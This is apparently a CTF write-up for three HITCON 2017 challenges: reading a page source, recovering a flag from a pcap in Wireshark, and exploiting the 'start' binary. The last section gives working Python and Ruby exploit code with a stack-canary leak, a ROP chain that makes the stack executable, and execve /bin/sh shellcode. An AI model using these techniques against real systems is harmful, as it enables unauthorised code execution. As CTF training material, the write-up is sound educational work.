## Visual Acuity 

> Welcome to HITCON CTF 2017  
> Your flag is here:

Below the challenge prompt was a `<div>` with a very large letter `h` and presumably some other text. Inspecting the page source leads you to the flag.

![Flag for Visual Acuity](/assets/hitcon2017/visualacuity.png)

The flag is `hitcon{enjoy_our_adaptive_scoring_system}`.

## Data and Mining

> My NAS is always busy...  
> [traffic-1b2b39e2c2231e6b98c77700da047b78.pcapng](https://xmunoz.com/ctfs/hitcon2017/traffic-1b2b39e2c2231e6b98c77700da047b78.pcapng)

The provided file is a 230 MB pcap. Let's download the pcap and open it in wireshark. 

![Wireshark pcap](/assets/hitcon2017/wireshark.png)

The first thing to notice is that much of the traffic seems to be in a protocol called "IPA". A quick google search reveals that "IPA" stands for "GSM over IP". I don't know anything about GSM over IP, but a closer inspection of the packet data reveals that this classification might be incorrect.

![ipa packet](/assets/hitcon2017/ipa.png)

That looks like good ol' HTTP to me. Wireshark has misclassified the protocol for these packets. Disable the IPA protocol by natigating to Analyze > Enabled Protcol.

![disable ipa](/assets/hitcon2017/ipadisable.png)

This didn't appear to have the desired effect for me. To really turn off IPA, go to Edit > Preferences and in the Protocols section, set the GSM IPA TCP port to 0.

![disable ipa again](/assets/hitcon2017/ipadisable2.png)

This causes wireshark to rescan the whole packet capture, which can take a while depending on your hardware. Now the packet capture should look something like this.

![new packet capture](/assets/hitcon2017/newcapture.png)

It's now possible to follow the TCP streams and look for interesting data. To look at a particular stream, right click any packet > Follow... > TCP Stream.

![follow tcp stream](/assets/hitcon2017/followstream.png)

The flag is found in stream 42, which can be filtered for with the expression `tcp.stream eq 42`. The flag is `hitcon{BTC_is_so_expensive_$$$$$$$}`.

## Start

Once connected, the server serving the `server.rb` script makes it clear that the start binary is hosted locally and that a ruby script must provided for it to run.

![server.rb](/assets/hitcon2017/serverrb.png)

Quickly looking over the `server.rb` script it seems to import the [ruby port](https://github.com/peter50216/pwntools-ruby) of the [pwntools library](https://github.com/Gallopsled/pwntools) - knowing this, let's start reversing and creating an exploit for the `start` binary using pwntools, to hopefully later on send the script to the server.

A stack canary is put on the stack preventing us from conventional buffer overflows or similar things that tamper with the stack. 

![stack canary](/assets/hitcon2017/canary.png)

Luckily there is a way to leak the canary abusing the `puts()` call. Reading in 24 characters and a newline char `\n`, `puts()` will print the canary except the last char which is overwritten by the `\n`. Luckily, the last char of the canary is a null-byte in this case so it won't matter.


Once the canary is obtained, it is a simple matter of creating the exploit.There are likely multiple paths to success once we control the return address. I chose to go with `mprotect()` which is a syscall allowing us to overwrite permissions on the stack, making it executable. This is necessary, since the binary is protected by [DEP/NX](https://msdn.microsoft.com/en-us/library/windows/desktop/ff966508(v=vs.85).aspx) which marks the stack, and potentially other memory regions, as non-executable.

The function `_dl_make_stack_executable` is already present in our static binary. It is essentially a wrapper around the `mprotect()` syscall. Using this function the stack is made executable, a payload is generated with `msfvenom` and the exploit is mounted.

Here is the initial script I wrote in python (to be ported to ruby).

```
#!/usr/bin/python2.7

import sys
from pwn import *

# Payload
payload = "A"*24 + "\n"

r = process('./start')

r.send(payload)

r.recvline() #echo

canary = struct.unpack("<Q", "\x00" + r.recv()[0:7])[0]
print "Leaked canary: " + hex(canary)

payload2 = "exit\n" + "A"*19 + struct.pack("<Q", canary) + "A"*8

payload2 += p64(0x466c09) # 0x0000000000466c09: pop rsi; ret;
payload2 += p64(0x6cbfe0) # 00000000006cbfe0 <__stack_prot>
payload2 += p64(0x4005d5) # 0x00000000004005d5: pop rdi; ret; 
payload2 += p64(0x7) # RWX Flag
payload2 += p64(0x41881b) # 0x000000000041881b: mov qword ptr [rsi], rdi; ret;

payload2 += p64(0x4005d5) # 0x00000000004005d5: pop rdi; ret
payload2 += p64(0x6cbf90) # 00000000006cbf90 <__libc_stack_end>:
payload2 += p64(0x4768a0) # 00000000004768a0 <_dl_make_stack_executable>:

# JMP RSP
payload2 += p64(0x4a554f) # 0x00000000004a554f: jmp rsp; 

# msfvenom -f python -p linux/x64/exec CMD=/bin/sh --platform linux
buf =  ""
buf += "\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68"
buf += "\x00\x53\x48\x89\xe7\x68\x2d\x63\x00\x00\x48\x89\xe6"
buf += "\x52\xe8\x08\x00\x00\x00\x2f\x62\x69\x6e\x2f\x73\x68"
buf += "\x00\x56\x57\x48\x89\xe6\x0f\x05"

payload2 += "\x90"*20 + buf

r.send(payload2 + "\n")

r.interactive()
r.clean()
r.close()
```

Once run a shell is obtained.

![local shell](/assets/hitcon2017/local-shell.png)

Porting to ruby was somewhat challenging, as I have little to no experience in ruby (although not much has to be changed). As far as I know, it is also not possible to make use of the interactive pipe in this case. Therefore, I chose to run single commands on the system eventually using `cat` to read the flag. I chose to re-write the script as a ruby one-liner although there are other ways to send it, through python sockets for example. This is the final ruby script sent to the server.

```
payload = "A"*24 + "\n" ;r = Sock.new '127.0.0.1', 31338 ;r.send(payload) ;r.recvline() ;canary = unpack("\x00" + r.recv()[0, 7], bits: 64, endian: 'little', signed: false) ;puts "Leaked canary: " + "0x" + canary.to_s(16) ;payload2 = "exit\n" + "A"*19 + p64(canary) + "A"*8 ;payload2 += p64(0x466c09) ;payload2 += p64(0x6cbfe0) ;payload2 += p64(0x4005d5) ;payload2 += p64(0x7) ;payload2 += p64(0x41881b) ;payload2 += p64(0x4005d5) ;payload2 += p64(0x6cbf90) ;payload2 += p64(0x4768a0) ;payload2 += p64(0x4a554f) ;buf = "\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00\x53\x48\x89\xe7\x68\x2d\x63\x00\x00\x48\x89\xe6\x52\xe8\x08\x00\x00\x00\x2f\x62\x69\x6e\x2f\x73\x68\x00\x56\x57\x48\x89\xe6\x0f\x05"; payload2 += "\x90"*20 + buf; r.send(payload2 + "\n"); r.sendline('/bin/cat /home/start/flag'); puts r.recv()
```

And flag received!

![flag](/assets/hitcon2017/flag.png)

The flag is `hitcon{thanks_for_using_pwntools-ruby:D}`
